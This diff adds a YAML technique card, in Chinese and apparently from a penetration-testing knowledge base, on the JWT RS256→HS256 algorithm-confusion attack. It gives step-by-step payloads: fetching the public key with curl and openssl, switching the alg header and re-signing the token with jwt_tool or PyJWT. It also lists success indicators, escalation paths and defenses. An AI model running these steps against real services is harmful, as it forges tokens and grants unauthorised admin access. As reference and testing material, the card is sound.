@@ -1,0 +1,70 @@
+# 技术卡片: JWT - RS256→HS256 算法混淆
+# 分类: jwt / algorithm-confusion
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-JWT-003 / PortSwigger
+
+id: "jwt-rs256-to-hs256"
+name: "JWT RS256→HS256 算法混淆攻击"
+category: "jwt"
+subcategory: "algorithm-confusion"
+severity: "critical"
+
+description: |
+  服务端用 RSA 公钥验证签名但接受 alg:HS256。
+  攻击者获取 RSA 公钥后，将其作为 HMAC secret 重新签名 JWT，
+  服务端用同一公钥做 HMAC 验证，签名通过。
+
+trigger_signals:
+  - "JWT 使用 RS256/RS384/RS512 签名"
+  - "服务端接受 alg:HS256"
+  - "RSA 公钥可获取（jwks.json / TLS 证书 / 错误消息）"
+  - "修改 alg 为 HS256 并用公钥重签名后仍通过验证"
+
+payloads:
+  - step: "获取 RSA 公钥"
+    action: "curl https://target/.well-known/jwks.json | jq .keys[0]"
+    alt: "openssl s_client -connect target:443 | openssl x509 -pubkey -noout"
+  - step: "公钥转 PEM 格式"
+    action: "将 jwks 的 n+e 转为 PEM 公钥文件"
+  - step: "篡改 JWT header"
+    action: "alg: RS256 → HS256"
+  - step: "用公钥 PEM 作为 HMAC secret 签名"
+    action: "python3 jwt_tool.py <token> -X k -pk public.pem"
+    alt: "import jwt; jwt.encode(payload, public_pem, algorithm='HS256')"
+  - step: "发送篡改 token"
+
+  - variant: "RS384→HS384"
+  - variant: "RS512→HS512"
+  - variant: "ES256→HS256"
+    note: "ECDSA 公钥也可用于 HMAC"
+
+success_indicators:
+  - "篡改 token 被接受（HTTP 200）"
+  - "可提权到 admin 或其他角色"
+  - "签名验证通过但 alg 不匹配"
+
+prerequisites:
+  - "RSA/ECDSA 公钥可获取"
+  - "服务端未固定 alg 白名单"
+  - "验证库接受将非对称密钥用于 HMAC"
+
+tools:
+  - "jwt_tool.py (https://github.com/ticarpi/jwt_tool)"
+  - "PyJWT / jwcrypto"
+  - "openssl (提取 TLS 证书公钥)"
+
+upgrade_paths:
+  - "jku 注入 + 自建 JWKS → 完全绕过"
+  - "kid 注入 → 路径遍历获取已知密钥"
+
+defense:
+  - "服务端固定 alg 白名单（如仅 RS256）"
+  - "禁止将非对称密钥用于 HMAC"
+  - "使用 typ 检查区分 JWT 类型"
+  - "jwt_tool / jwks_attack 可自动化检测此漏洞"
+
+sources:
+  - kb: "KB-JWT-003"
+  - ref: "PortSwigger: JWT algorithm confusion"
+  - ref: "CWE-347"
